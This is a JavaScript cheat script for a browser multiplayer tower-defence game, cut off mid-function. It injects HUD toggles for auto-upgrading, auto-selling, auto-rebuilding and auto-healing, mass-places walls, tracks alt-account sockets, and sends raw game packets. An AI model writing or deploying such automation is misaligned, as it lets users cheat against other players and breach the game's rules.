window.thisWeapon = "Pickaxe";
let interval_1;

let showplayersinfo = false;
let _showRss = true;

let sessionPlayerFinderRank = 0;
let sessionMouseMove = true;
let isSentOnce = false;

let count = 0;
let sessions = 0;
let oldSessions = 0;

let ahrc_1 = false;
let ahrc_turn_id = "main";

window.myPsk = "";
window.sessionUid = null;

let sockets = {};
let socketsByUid = {};
window.sockets = sockets;
window.socketsByUid = socketsByUid;

let myMouse = {};
let sessionMouse = {};
let nearestAltMouse = {};
let nearestSessionMouse = {};
let entities = new Map();
window.entities = entities;

let s = {};
let playerX = -1;
let playerY = -1;
let yaw = 0;

let myPlayer = {};
let myPet = {};
window.myPlayer = myPlayer;
window.myPet = myPet;


altName = " ";

window.activated = false;



let autoclearmessages = false;

let daySeconds = 0;
let sbtStartTick = 60;
let sbtEndTick = 65;

let autotier1spear = false;
let autotier2spear = false;
let autotier3spear = false;
let autotier4spear = false;
let autotier5spear = false;
let autotier6spear = false;
let autotier7spear = false;

let should9x9Walls = false;

const counter = (e = 0) => {
    return e <= 999.5 ? Math.floor(e) + "" : e <= 999500 ? Math.floor(e/1e2)/10 + "K" : e <= 999500000 ? Math.floor(e/1e5)/10 + "M" : e <= 999500000000 ? Math.floor(e/1e8)/10 + "B" : e <= 999500000000000 ? Math.floor(e/1e11)/10 + "T" : "Many";
}

function placeWall(x, y) {
    game.network.sendRpc({ name: 'MakeBuilding', x: x, y: y, type: "Wall", yaw: 0 });
 }

 document.addEventListener('mousemove', e => {
    myMouse = { x: e.clientX, y: e.clientY };
    if (game.inputManager.mouseDown && game.ui.components.PlacementOverlay.buildingId == "Wall") {
       var buildingSchema = game.ui.getBuildingSchema();
       var schemaData = buildingSchema.Wall;
       var world = game.world;
       var worldPos = game.renderer.screenToWorld(myMouse.x, myMouse.y);
       var cellIndexes = world.entityGrid.getCellIndexes(worldPos.x, worldPos.y, { width: schemaData.gridWidth, height: schemaData.gridHeight });
       var cellSize = world.entityGrid.getCellSize();
       var cellAverages = { x: 0, y: 0 };
       for (var i in cellIndexes) {
          if (!cellIndexes[i]) {
             return false;
          }
          var cellPos = world.entityGrid.getCellCoords(cellIndexes[i]);
          cellAverages.x += cellPos.x;
          cellAverages.y += cellPos.y;
       }
       cellAverages.x = cellAverages.x / cellIndexes.length;
       cellAverages.y = cellAverages.y / cellIndexes.length;
       var gridPos = {
          x: cellAverages.x * cellSize + cellSize / 2,
          y: cellAverages.y * cellSize + cellSize / 2
       };
       if (should9x9Walls) {
          //layer 1
          placeWall(gridPos.x - 48 - 48 - 48 - 48, gridPos.y + 48 + 48 + 48 + 48);
          placeWall(gridPos.x - 48 - 48 - 48, gridPos.y + 48 + 48 + 48 + 48);
          placeWall(gridPos.x - 48 - 48, gridPos.y + 48 + 48 + 48 + 48);
          placeWall(gridPos.x - 48, gridPos.y + 48 + 48 + 48 + 48);
          placeWall(gridPos.x, gridPos.y + 48 + 48 + 48 + 48);
          placeWall(gridPos.x + 48, gridPos.y + 48 + 48 + 48 + 48);
          placeWall(gridPos.x + 48 + 48, gridPos.y + 48 + 48 + 48 + 48);
          placeWall(gridPos.x + 48 + 48 + 48, gridPos.y + 48 + 48 + 48 + 48);
          placeWall(gridPos.x + 48 + 48 + 48 + 48, gridPos.y + 48 + 48 + 48 + 48);
          //layer 2
          placeWall(gridPos.x - 48 - 48 - 48 - 48, gridPos.y + 48 + 48 + 48);
          placeWall(gridPos.x - 48 - 48 - 48, gridPos.y + 48 + 48 + 48);
          placeWall(gridPos.x - 48 - 48, gridPos.y + 48 + 48 + 48);
          placeWall(gridPos.x - 48, gridPos.y + 48 + 48 + 48);
          placeWall(gridPos.x, gridPos.y + 48 + 48 + 48);
          placeWall(gridPos.x + 48, gridPos.y + 48 + 48 + 48);
          placeWall(gridPos.x + 48 + 48, gridPos.y + 48 + 48 + 48);
          placeWall(gridPos.x + 48 + 48 + 48, gridPos.y + 48 + 48 + 48);
          placeWall(gridPos.x + 48 + 48 + 48 + 48, gridPos.y + 48 + 48 + 48);
          //layer 3
          placeWall(gridPos.x - 48 - 48 - 48 - 48, gridPos.y + 48 + 48);
          placeWall(gridPos.x - 48 - 48 - 48, gridPos.y + 48 + 48);
          placeWall(gridPos.x - 48 - 48, gridPos.y + 48 + 48);
          placeWall(gridPos.x - 48, gridPos.y + 48 + 48);
          placeWall(gridPos.x, gridPos.y + 48 + 48);
          placeWall(gridPos.x + 48, gridPos.y + 48 + 48);
          placeWall(gridPos.x + 48 + 48, gridPos.y + 48 + 48);
          placeWall(gridPos.x + 48 + 48 + 48, gridPos.y + 48 + 48);
          placeWall(gridPos.x + 48 + 48 + 48 + 48, gridPos.y + 48 + 48);
          //layer 4
          placeWall(gridPos.x - 48 - 48 - 48 - 48, gridPos.y + 48);
          placeWall(gridPos.x - 48 - 48 - 48, gridPos.y + 48);
          placeWall(gridPos.x - 48 - 48, gridPos.y + 48);
          placeWall(gridPos.x - 48, gridPos.y + 48);
          placeWall(gridPos.x, gridPos.y + 48);
          placeWall(gridPos.x + 48, gridPos.y + 48);
          placeWall(gridPos.x + 48 + 48, gridPos.y + 48)
          placeWall(gridPos.x + 48 + 48 + 48, gridPos.y + 48);
          placeWall(gridPos.x + 48 + 48 + 48 + 48, gridPos.y + 48);
          //layer 5
          placeWall(gridPos.x - 48 - 48 - 48 - 48, gridPos.y);
          placeWall(gridPos.x - 48 - 48 - 48, gridPos.y);
          placeWall(gridPos.x - 48 - 48, gridPos.y);
          placeWall(gridPos.x - 48, gridPos.y);
          placeWall(gridPos.x, gridPos.y);
          placeWall(gridPos.x + 48, gridPos.y);
          placeWall(gridPos.x + 48 + 48, gridPos.y)
          placeWall(gridPos.x + 48 + 48 + 48, gridPos.y);
          placeWall(gridPos.x + 48 + 48 + 48 + 48, gridPos.y);
          //layer 6
          placeWall(gridPos.x - 48 - 48 - 48 - 48, gridPos.y - 48);
          placeWall(gridPos.x - 48 - 48 - 48, gridPos.y - 48);
          placeWall(gridPos.x - 48 - 48, gridPos.y - 48);
          placeWall(gridPos.x - 48, gridPos.y - 48);
          placeWall(gridPos.x, gridPos.y - 48);
          placeWall(gridPos.x + 48, gridPos.y - 48);
          placeWall(gridPos.x + 48 + 48, gridPos.y - 48)
          placeWall(gridPos.x + 48 + 48 + 48, gridPos.y - 48);
          placeWall(gridPos.x + 48 + 48 + 48 + 48, gridPos.y - 48);
          //layer 7
          placeWall(gridPos.x - 48 - 48 - 48 - 48, gridPos.y - 48 - 48);
          placeWall(gridPos.x - 48 - 48 - 48, gridPos.y - 48 - 48);
          placeWall(gridPos.x - 48 - 48, gridPos.y - 48 - 48);
          placeWall(gridPos.x - 48, gridPos.y - 48 - 48);
          placeWall(gridPos.x, gridPos.y - 48 - 48);
          placeWall(gridPos.x + 48, gridPos.y - 48 - 48);
          placeWall(gridPos.x + 48 + 48, gridPos.y - 48 - 48);
          placeWall(gridPos.x + 48 + 48 + 48, gridPos.y - 48 - 48);
          placeWall(gridPos.x + 48 + 48 + 48 + 48, gridPos.y - 48 - 48);
          //layer 8
          placeWall(gridPos.x - 48 - 48 - 48 - 48, gridPos.y - 48 - 48 - 48);
          placeWall(gridPos.x - 48 - 48 - 48, gridPos.y - 48 - 48 - 48);
          placeWall(gridPos.x - 48 - 48, gridPos.y - 48 - 48 - 48);
          placeWall(gridPos.x - 48, gridPos.y - 48 - 48 - 48);
          placeWall(gridPos.x, gridPos.y - 48 - 48 - 48);
          placeWall(gridPos.x + 48, gridPos.y - 48 - 48 - 48);
          placeWall(gridPos.x + 48 + 48, gridPos.y - 48 - 48 - 48);
          placeWall(gridPos.x + 48 + 48 + 48, gridPos.y - 48 - 48 - 48);
          placeWall(gridPos.x + 48 + 48 + 48 + 48, gridPos.y - 48 - 48 - 48);
          //layer 9
          placeWall(gridPos.x - 48 - 48 - 48 - 48, gridPos.y - 48 - 48 - 48 - 48);
          placeWall(gridPos.x - 48 - 48 - 48, gridPos.y - 48 - 48 - 48 - 48);
          placeWall(gridPos.x - 48 - 48, gridPos.y - 48 - 48 - 48 - 48);
          placeWall(gridPos.x - 48, gridPos.y - 48 - 48 - 48 - 48);
          placeWall(gridPos.x, gridPos.y - 48 - 48 - 48 - 48);
          placeWall(gridPos.x + 48, gridPos.y - 48 - 48 - 48 - 48);
          placeWall(gridPos.x + 48 + 48, gridPos.y - 48 - 48 - 48 - 48);
          placeWall(gridPos.x + 48 + 48 + 48, gridPos.y - 48 - 48 - 48 - 48);
          placeWall(gridPos.x + 48 + 48 + 48 + 48, gridPos.y - 48 - 48 - 48 - 48);
       }
    }
 })


setInterval(() => {
    if (autoclearmessages) {
        const chatMessages = document.getElementsByClassName('hud-chat-message');
        while (chatMessages.length > 0) {
            chatMessages[0].remove();
        }
    }
}, 1000);

let evolvePetTiersAndExp = {
    "1, 9, 100": 1,
    "2, 17, 100": 1,
    "3, 25, 100": 1,
    "4, 33, 100": 1,
    "5, 49, 200": 1,
    "6, 65, 200": 1,
    "7, 97, 300": 1
}

let includeEntity = {"name": 1, "uid": 1, "model": 1, "entityClass": 1, "health": 1, "maxHealth": 1, "yaw": 1, "position": 1, "dead": 1, "experience": 1, "tier": 1, "wood": 1, "stone": 1, "gold": 1, "token": 1, "partyId": 1, "petUid": 1, "score": 1, "wave": 1, "weaponName": 1}
let addMissingTickFields = function (tick, lastTick) {
    let obj = Object.keys(lastTick);
    for (let i = 0; i < obj.length; i++) {
        let e = obj[i];
        includeEntity[e] && (tick[e] = lastTick[e]);
    }
};

let returnRequiredLevelIfHigher = (level, returnRequiredLevelIfHigher) => {
    return level > returnRequiredLevelIfHigher ? returnRequiredLevelIfHigher : level;
}

let detectPetLevelIfHigherReturnItsRequiredLevel = (tier, level) => {
    let evolveLevel = [9, 17, 25, 33, 49, 65, 97][tier - 1] | 0;
    return returnRequiredLevelIfHigher(level, evolveLevel);
}

let detectPetTokenIfHigherReturnItsRequiredLevel = (tier, token) => {
    let evolveToken = [100, 100, 100, 100, 200, 200, 300][tier - 1] | 0;
    return returnRequiredLevelIfHigher(token, evolveToken);
}

const measureDistance = (obj1, obj2) => {
    let a = (obj2.x - obj1.x) | 0;
    let b = (obj2.y - obj1.y) | 0;
    let c = (a*a + b*b) | 0;
    return (c ** 0.5) | 0;
}

let mouse = {};

let angleTo = (xFrom, yFrom, xTo, yTo) => {
    return ((Math.atan2(yTo - yFrom, xTo - xFrom) / (Math.PI/180) + 450) % 360) | 0;
};

let screenToYaw = function (x, y) {
    return angleTo(game.renderer.getWidth() / 2, game.renderer.getHeight() / 2, x, y);
};

let screenToWorld = (x, y) => {
    let ratio = Math.max((window.innerWidth * window.devicePixelRatio) / 1920, (window.innerHeight * window.devicePixelRatio) / 1080);
    let scale = ratio == game.renderer.scale ? ratio : game.renderer.scale;
    let halfX = (window.innerWidth * window.devicePixelRatio) / 2;
    let halfY = (window.innerHeight * window.devicePixelRatio) / 2;
    let position = {x: -(game.ui.playerTick?.position.x * scale) + halfX, y: -(game.ui.playerTick?.position.y * scale) + halfY};
    return {
        x: (-position.x * (1 / scale)) + (x * (1 / scale) * window.devicePixelRatio),
        y: (-position.y * (1 / scale)) + (y * (1 / scale) * window.devicePixelRatio)
    };
}

let aimToYaw = (num) => !(num > 90 + 23) && !(num < 90 - 23)
? 90 : !(num > 225 + 23) && !(num < 225 - 23)
? 225 : !(num > 135 + 23) && !(num < 135 - 23)
? 135 : !(num > 360 + 23) && !(num < 360 - 23)
? 359 : !(num > 0 + 23) && !(num < 0 - 23)
? 359 : !(num > 180 + 23) && !(num < 180 - 23)
? 180 : !(num > 270 + 23) && !(num < 270 - 23)
? 270 : !(num > 315 + 23) && !(num < 315 - 23)
? 314 : !(num > 45 + 23) && !(num < 45 - 23)
? 44 : null

let RoundPlayer = (a = 0) => {
    let n = a % 8;
    if (n == 0) {
        return {x: myPlayer.position.x + 500, y: myPlayer.position.y};
    }
    if (n == 1) {
        return {x: myPlayer.position.x + 250, y: myPlayer.position.y + 250};
    }
    if (n == 2) {
        return {x: myPlayer.position.x, y: myPlayer.position.y + 500};
    }
    if (n == 3) {
        return {x: myPlayer.position.x - 250, y: myPlayer.position.y + 250};
    }
    if (n == 4) {
        return {x: myPlayer.position.x - 500, y: myPlayer.position.y};
    }
    if (n == 5) {
        return {x: myPlayer.position.x - 250, y: myPlayer.position.y - 250};
    }
    if (n == 6) {
        return {x: myPlayer.position.x, y: myPlayer.position.y - 500};
    }
    if (n == 7) {
        return {x: myPlayer.position.x + 250, y: myPlayer.position.y - 250};
    }
}

let spinning;
let reversedYaw = false;

document.getElementsByClassName("hud")[0].addEventListener("mousedown", function(e) {
    if (e.button == 2) {
        reversedYaw = true;
    }
});
document.getElementsByClassName("hud")[0].addEventListener("mouseup", function(e) {
    if (e.button == 2) {
        reversedYaw = false;
    }
});

class Session {
    constructor() {
        this.ab = false;
        this.au = false;
        this.atb = false;
        this.aa = false;
        this.apr = false;
        this.ape = false;
        this.ahrc = false;
        this.pt = false;
        this.rpt = false;
        this.at = false;
        this.uth = false;
        this.hth = false;
        this.ua = false;
        this.sa = false;
        this.sbt = false;
        this.mpt = false;
        this.mb = false;
        this.mm = false;
        this.sc = false;
        this.aaj = false;
        this.as = false;
    }
}

class Scripts {
    constructor() {
        this.autobow = false;
        this.autoupgrade = false;
        this.autosell = false;
        this.autorebuilder = false;
        this.autoreupgrader = false;
        this.upgradetowerhealth = false;
        this.healtowerhealth = false;
        this.autosellinvalidtowers = false;
        this.autosellmaxedtowers = false;
        this.scorelogger = false;
        this.autoheal = {enabled: true, healSet: 20, autobuypotion: true};
        this.autopetheal = {enabled: true, healSet: 70, autobuypotion: false};
        this.xkey = false;
        this.autoreconnect = false;
        this.autorespawn = true;
        this.autoRevivePets = false;
        this.autoEvolvePets = true;
        this.socketFollowMouse = false;
        this.socketRoundPlayer = false;
        this.mousePositionToggle = true;
        this.socketMouseDown = true;
        this.autoRefiller = false;
        this.ahrc = {enabled: () => ahrc_1, toggle: () => {ahrc_1 = !ahrc_1}, toTrue: () => {ahrc_1 = true}, toFalse: () => {ahrc_1 = false}};
        this.sbt = {enabled: false, startTick: 102, endTick: 107};
        this.autoaltjoin = false;
    }
}

class Script {
    constructor() {
        this.scripts = new Scripts();
        this.session = new Session();
        this.model = {};
        this.tier = {};
        this.buildOnce = false;
        this.sellOnce = false;
        this.waveNumber = 0;
        this.oldScore = 0;
        this.newScore = 0;
        this.scoreLogged = 0;
        this.scores = [];
        this.sum = 0;
        this.autoUpgradeTicks = 0;
        this.autoSellTicks = 0;
        this.spamMessagesTicks = 0;
        this.players = 0;
        this.oldPlayers = 0;
        this.parties = "";
        this.num = 0;
        this.gs = null;
        this.target = {};
        this.tree = {};
        this.stone = {};
        this.rebuilder = new Map();
        this.rebuilder2 = new Map();
        this.reupgrader = new Map();
        this.reupgrader2 = new Map();
        this.inactiveReupgrader = new Map();
        this.harvesters = new Map();
        this.harvesterTicks = [
            {tick: 0, resetTick: 31, deposit: 0.4, tier: 1},
            {tick: 0, resetTick: 29, deposit: 0.6, tier: 2},
            {tick: 0, resetTick: 27, deposit: 0.7, tier: 3},
            {tick: 0, resetTick: 24, deposit: 1, tier: 4},
            {tick: 0, resetTick: 22, deposit: 1.2, tier: 5},
            {tick: 0, resetTick: 20, deposit: 1.2, tier: 6},
            {tick: 0, resetTick: 18, deposit: 2.4, tier: 7},
            {tick: 0, resetTick: 16, deposit: 3, tier: 8}
        ];
        this.tick = 100;
        this.reversedYaw = false;
        this.uthTicks = 0;
        this.revertTicks = 0;
    }
    sendPacket = (event, data) => {
        game.network.socket.readyState == 1 && game.network.socket.send(game.network.codec.encode(event, data));
    }
    getElement = (e) => {
        return document.getElementsByClassName(e);
    }
    getId = (id) => {
        return document.getElementById(id);
    }
    angleTo(xFrom, yFrom, xTo, yTo) {
        let dx = xTo - xFrom;
        let dy = yTo - yFrom;
        let yaw = Math.atan2(dy, dx) * 180.0 / Math.PI;
        let nonZeroYaw = yaw + 180.0;
        let reversedYaw = nonZeroYaw;
        let shiftedYaw = (360.0 + reversedYaw - 90.0) % 360.0;
        return shiftedYaw;
    }
    screenToYaw(x, y) {
        let angle = Math.round(this.angleTo(game.renderer.getWidth() / 2, game.renderer.getHeight() / 2, x, y));
        return angle % 360;
    }
    counter(e = 0) {
        if (e <= -0.99949999999999999e24) {
            return Math.round(e/-1e23)/-10 + "TT";
        };
        if (e <= -0.99949999999999999e21) {
            return Math.round(e/-1e20)/-10 + "TB";
        };
        if (e <= -0.99949999999999999e18) {
            return Math.round(e/-1e17)/-10 + "TM";
        };
        if (e <= -0.99949999999999999e15) {
            return Math.round(e/-1e14)/-10 + "TK";
        };
        if (e <= -0.99949999999999999e12) {
            return Math.round(e/-1e11)/-10 + "T";
        };
        if (e <= -0.99949999999999999e9) {
            return Math.round(e/-1e8)/-10 + "B";
        };
        if (e <= -0.99949999999999999e6) {
            return Math.round(e/-1e5)/-10 + "M";
        };
        if (e <= -0.99949999999999999e3) {
            return Math.round(e/-1e2)/-10 + "K";
        };
        if (e <= 0.99949999999999999e3) {
            return Math.round(e) + "";
        };
        if (e <= 0.99949999999999999e6) {
            return Math.round(e/1e2)/10 + "K";
        };
        if (e <= 0.99949999999999999e9) {
            return Math.round(e/1e5)/10 + "M";
        };
        if (e <= 0.99949999999999999e12) {
            return Math.round(e/1e8)/10 + "B";
        };
        if (e <= 0.99949999999999999e15) {
            return Math.round(e/1e11)/10 + "T";
        };
        if (e <= 0.99949999999999999e18) {
            return Math.round(e/1e14)/10 + "TK";
        };
        if (e <= 0.99949999999999999e21) {
            return Math.round(e/1e17)/10 + "TM";
        };
        if (e <= 0.99949999999999999e24) {
            return Math.round(e/1e20)/10 + "TB";
        };
        if (e <= 0.99949999999999999e27) {
            return Math.round(e/1e+23)/10 + "TT";
        };
        if (e >= 0.99949999999999999e27) {
            return Math.round(e/1e+23)/10 + "TT";
        };
    };
    setElementToggleTo = (enabled, classname) => {
        if (!enabled) {
            this.getElement(classname)[0].innerText = this.getElement(classname)[0].innerText.replace("Disable", "Enable");
            this.getElement(classname)[0].className = this.getElement(classname)[0].className.replace("red", "blue");
        } else {
            this.getElement(classname)[0].innerText = this.getElement(classname)[0].innerText.replace("Enable", "Disable");
            this.getElement(classname)[0].className = this.getElement(classname)[0].className.replace("blue", "red");
        }
    }
    depositAhrc = (tick) => {
        this.harvesters.forEach(e => {
            if (e.tier == tick.tier) {
                this.sendPacket(9, {name: "AddDepositToHarvester", uid: e.uid, deposit: tick.deposit})
            }
        })
    }
    collectAhrc = (tick) => {
        this.harvesters.forEach(e => {
            if (e.tier == tick.tier) {
                this.sendPacket(9, {name: "CollectHarvester", uid: e.uid})
            }
        })
    }
    onEnterWorldHandler = (e) => {
        if (!e.allowed) return;
        game.renderer.renderer.background.backgroundColor.value = 0;
        game.ui.components.PopupOverlay.showHint(`This server was last reset ${(e.startingTick / 1.728e6).toFixed(2)} days ago.`);
        myPlayer.uid = e.uid;
        myPlayer.name = e.effectiveDisplayName;
        altName = e.effectiveDisplayName;
        this.getElement("hud-party-members")[0].style.display = "block";
        this.getElement("hud-party-grid")[0].style.display = "none";
        let privateTab = document.createElement("a");
        privateTab.className = "hud-party-tabs-link";
        privateTab.id = "privateTab";
        privateTab.innerHTML = "Closed Parties";
        let privateHud = document.createElement("div");
        privateHud.className = "hud-private hud-party-grid";
        privateHud.id = "privateHud";
        privateHud.style = "display: none;";
        this.getElement("hud-party-tabs")[0].appendChild(privateTab);
        this.getElement("hud-menu hud-menu-party")[0].insertBefore(privateHud, this.getElement("hud-party-actions")[0]);
        let keyTab = document.createElement("a");
        keyTab.className = "hud-party-tabs-link";
        keyTab.id = "keyTab";
        keyTab.innerHTML = "Keys";
        this.getElement("hud-party-tabs")[0].appendChild(keyTab);
        let keyHud = document.createElement("div");
        keyHud.className = "hud-keys hud-party-grid";
        keyHud.id = "keyHud";
        keyHud.style = "display: none;";
        this.getElement("hud-menu hud-menu-party")[0].insertBefore(keyHud, this.getElement("hud-party-actions")[0]);
        this.getId("privateTab").onclick = e => {
            for (let i = 0; i < this.getElement("hud-party-tabs-link").length; i++) this.getElement("hud-party-tabs-link")[i].className = "hud-party-tabs-link";
            this.getId("privateTab").className = "hud-party-tabs-link is-active";
            this.getId("privateHud").setAttribute("style", "display: block;");
            this.getElement("hud-party-members")[0].getAttribute("style") == "display: block;" && this.getElement("hud-party-members")[0].setAttribute("style", "display: none;");
            this.getElement("hud-party-grid")[0].getAttribute("style") == "display: block;" && this.getElement("hud-party-grid")[0].setAttribute("style", "display: none;");
            this.getId("privateHud").getAttribute("style") == "display: none;" && this.getId("privateHud").setAttribute("style", "display: block;");
            this.getId("keyHud").getAttribute("style") == "display: block;" && this.getId("keyHud").setAttribute("style", "display: none;");
        }
        this.getElement("hud-party-tabs-link")[0].onmouseup = e => {
            this.getId("privateHud").setAttribute("style", "display: none;");
            this.getId("keyHud").setAttribute("style", "display: none;");
            this.getId("privateTab").className == "hud-party-tabs-link is-active" && (this.getId("privateTab").className = "hud-party-tabs-link");
            this.getId("keyTab").className == "hud-party-tabs-link is-active" && (this.getId("keyTab").className = "hud-party-tabs-link");
        }
        this.getElement("hud-party-tabs-link")[1].onmouseup = e => {
            this.getId("privateHud").setAttribute("style", "display: none;");
            this.getId("keyHud").setAttribute("style", "display: none;");
            this.getId("privateTab").className == "hud-party-tabs-link is-active" && (this.getId("privateTab").className = "hud-party-tabs-link");
            this.getId("keyTab").className == "hud-party-tabs-link is-active" && (this.getId("keyTab").className = "hud-party-tabs-link");
        }
        this.getId("keyTab").onmouseup = e => {
            for (let i = 0; i < this.getElement("hud-party-tabs-link").length; i++) this.getElement("hud-party-tabs-link")[i].className = "hud-party-tabs-link";
            this.getId("keyTab").className = "hud-party-tabs-link is-active";
            this.getId("keyHud").setAttribute("style", "display: block;");
            this.getElement("hud-party-members")[0].getAttribute("style") == "display: block;" && this.getElement("hud-party-members")[0].setAttribute("style", "display: none;");
            this.getElement("hud-party-grid")[0].getAttribute("style") == "display: block;" && this.getElement("hud-party-grid")[0].setAttribute("style", "display: none;");
            this.getId("privateHud").getAttribute("style") == "display: block;" && this.getId("privateHud").setAttribute("style", "display: none;");
            this.getId("keyHud").getAttribute("style") == "display: none;" && this.getId("keyHud").setAttribute("style", "display: block;");
        }
        this.getElement("X2")[0].onclick = () => {
            this.scripts.autoupgrade = !this.scripts.autoupgrade;
            this.getElement("X2")[0].innerText = `Auto Upgrade Buildings ${this.scripts.autoupgrade ? "On" : "Off"}`;
            this.setElementToggleTo(this.scripts.autoupgrade, "X2");
        }
        this.getElement("X4")[0].onclick = () => {
            this.scripts.autosell = !this.scripts.autosell;
            this.getElement("X4")[0].innerText = `Auto Sell Buildings ${this.scripts.autosell ? "On" : "Off"}`;
            this.setElementToggleTo(this.scripts.autosell, "X4");
        }
        this.getElement("X7")[0].onclick = () => {
            const rebuilder = new Map();
            const reupgrader = new Map();
            Object.values(game.ui.buildings).forEach(e => {
                this.getElement("X5")[0].value.length > 0 && rebuilder.set((e.x - this.gs.x) / 24 + (e.y - this.gs.y) / 24 * 1000, [(e.x - this.gs.x) / 24, (e.y - this.gs.y) / 24, e.type, (game.world.entities.get(e.uid) ? game.world.entities.get(e.uid).targetTick.yaw : 0)]);
                this.getElement("X6")[0].value.length > 0 && reupgrader.set((e.x - this.gs.x) / 24 + (e.y - this.gs.y) / 24 * 1000, [(e.x - this.gs.x) / 24, (e.y - this.gs.y) / 24, e.tier]);
            });
            this.getElement("X5")[0].value.length > 0 && (localStorage[`${this.getElement("X5")[0].value}`] = JSON.stringify(Object.fromEntries(rebuilder)));
            this.getElement("X6")[0].value.length > 0 && (localStorage[`${this.getElement("X6")[0].value}`] = JSON.stringify(Object.fromEntries(reupgrader)));
        }
        this.getElement("X8")[0].onclick = () => {
            this.getElement("X5")[0].value.length > 0 && localStorage[`${this.getElement("X5")[0].value}`] && delete localStorage[`${this.getElement("X5")[0].value}`];
            this.getElement("X6")[0].value.length > 0 && localStorage[`${this.getElement("X6")[0].value}`] && delete localStorage[`${this.getElement("X6")[0].value}`];
        }
        this.getElement("X9")[0].onclick = () => {
            this.scripts.autorebuilder = !this.scripts.autorebuilder;
            this.rebuilder.forEach((e, t) => this.rebuilder.delete(t));
            if (this.scripts.autorebuilder) {
                if (localStorage[`${this.getElement("X5")[0].value}`]) {
                    this.rebuilder = new Map(Object.entries(JSON.parse(localStorage[`${document.getElementsByClassName("X5")[0].value}`])));
                    this.rebuilder2 = new Map();
                    this.rebuilder.forEach(e => {
                        this.rebuilder2.set(JSON.parse(e[0]) + JSON.parse(e[1]) * 1000, e);
                    });
                    this.rebuilder = this.rebuilder2;
                } else {
                    Object.values(game.ui.buildings).forEach(e => {
                        this.rebuilder.set((e.x - this.gs.x) / 24 + (e.y - this.gs.y) / 24 * 1000, [(e.x - this.gs.x) / 24, (e.y - this.gs.y) / 24, e.type, (game.world.entities.get(e.uid) ? game.world.entities.get(e.uid).targetTick.yaw : 0)]);
                    });
                }
            }
            this.getElement("X9")[0].innerText = `Auto Rebuilder ${this.scripts.autorebuilder ? "On" : "Off"}`;
            this.setElementToggleTo(this.scripts.autorebuilder, "X9");
        }
        this.getElement("X10")[0].onclick = () => {
            this.scripts.autoreupgrader = !this.scripts.autoreupgrader;
            this.reupgrader.forEach((e, t) => this.reupgrader.delete(t));
            this.inactiveReupgrader.forEach((e, t) => this.inactiveReupgrader.delete(t));
            if (this.scripts.autoreupgrader) {
                if (localStorage[`${this.getElement("X6")[0].value}`]) {
                    this.reupgrader = new Map(Object.entries(JSON.parse(localStorage[`${document.getElementsByClassName("X6")[0].value}`])));
                    this.reupgrader2 = new Map();
                    this.reupgrader.forEach(e => {
                        this.reupgrader2.set(JSON.parse(e[0]) + JSON.parse(e[1]) * 1000, e);
                    });
                    this.reupgrader = this.reupgrader2;
                } else {
                    Object.values(game.ui.buildings).forEach(e => {
                        this.reupgrader.set((e.x - this.gs.x) / 24 + (e.y - this.gs.y) / 24 * 1000, [(e.x - this.gs.x) / 24, (e.y - this.gs.y) / 24, e.tier]);
                    });
                }
            }
            this.getElement("X10")[0].innerText = `Auto Reupgrader ${this.scripts.autoreupgrader ? "On" : "Off"}`;
            this.setElementToggleTo(this.scripts.autoreupgrader, "X10");
        }
        this.getElement("X12")[0].onclick = () => {
            this.scripts.upgradetowerhealth = !this.scripts.upgradetowerhealth;
            this.getElement("X12")[0].innerText = `UTH ${this.scripts.upgradetowerhealth ? "On" : "Off"}`;
            this.setElementToggleTo(this.scripts.upgradetowerhealth, "X12");
        }
        this.getElement("X14")[0].onclick = () => {
            this.scripts.healtowerhealth = !this.scripts.healtowerhealth;
            this.getElement("X14")[0].innerText = `HTH ${this.scripts.healtowerhealth ? "On" : "Off"}`;
            this.setElementToggleTo(this.scripts.healtowerhealth, "X14");
        }
        this.getElement("X15")[0].onclick = () => {
            this.scripts.autosellinvalidtowers = !this.scripts.autosellinvalidtowers;
            this.getElement("X15")[0].innerText = `Auto Sell Invalid Towers ${this.scripts.autosellinvalidtowers ? "On" : "Off"}`;
            this.setElementToggleTo(this.scripts.autosellinvalidtowers, "X15");
        }
        this.getElement("X16")[0].onclick = () => {
            this.scripts.autosellmaxedtowers = !this.scripts.autosellmaxedtowers;
            this.getElement("X16")[0].innerText = `Auto Sell Maxed Towers ${this.scripts.autosellmaxedtowers ? "On" : "Off"}`;
            this.setElementToggleTo(this.scripts.autosellmaxedtowers, "X16");
        }
        this.getElement("X17")[0].onclick = () => {
            this.scripts.autoRevivePets = !this.scripts.autoRevivePets;
            this.getElement("X17")[0].innerText = `${this.scripts.autoRevivePets ? "Disable" : "Enable"} Auto Pet Revive`;
            this.setElementToggleTo(this.scripts.autoRevivePets, "X17");
        }
        this.getElement("X18")[0].onclick = () => {
            this.scripts.autoEvolvePets = !this.scripts.autoEvolvePets;
            this.getElement("X18")[0].innerText = `${this.scripts.autoEvolvePets ? "Disable" : "Enable"} Auto Pet Evolve`;
            this.setElementToggleTo(this.scripts.autoEvolvePets, "X18");
        }
        this.getElement("X19")[0].onclick = () => {
            this.scripts.autoheal.enabled = !this.scripts.autoheal.enabled;
            this.getElement("X19")[0].innerText = `${this.scripts.autoheal.enabled ? "Disable" : "Enable"} Auto Heal`;
            this.setElementToggleTo(this.scripts.autoheal.enabled, "X19");
        }
        this.getElement("X20")[0].onclick = () => {
            this.scripts.autoheal.autobuypotion = !this.scripts.autoheal.autobuypotion;
            this.getElement("X20")[0].innerText = `${this.scripts.autoheal.autobuypotion ? "Disable" : "Enable"} Autobuy Potion`;
            this.setElementToggleTo(this.scripts.autoheal.autobuypotion, "X20");
        }
        this.getElement("X21")[0].onclick = () => {
            this.scripts.autopetheal.enabled = !this.scripts.autopetheal.enabled;
            this.getElement("X21")[0].innerText = `${this.scripts.autopetheal.enabled ? "Disable" : "Enable"} Auto Pet Heal`;
            this.setElementToggleTo(this.scripts.autopetheal.enabled, "X21");
        }
        this.getElement("X22")[0].onclick = () => {
            this.scripts.autopetheal.autobuypotion = !this.scripts.autopetheal.autobuypotion;
            this.getElement("X22")[0].innerText = `${this.scripts.autopetheal.autobuypotion ? "Disable" : "Enable"} Autobuy Potion`;
            this.setElementToggleTo(this.scripts.autopetheal.autobuypotion, "X22");
        }
        this.getElement("X23")[0].onclick = () => {
            this.scripts.autoreconnect = !this.scripts.autoreconnect;
            this.getElement("X23")[0].innerText = `${this.scripts.autoreconnect ? "Disable" : "Enable"} Auto Reconnect`;
            this.setElementToggleTo(this.scripts.autoreconnect, "X23");
        }
        this.getElement("X24")[0].onclick = () => {
            this.scripts.autoRefiller = !this.scripts.autoRefiller;
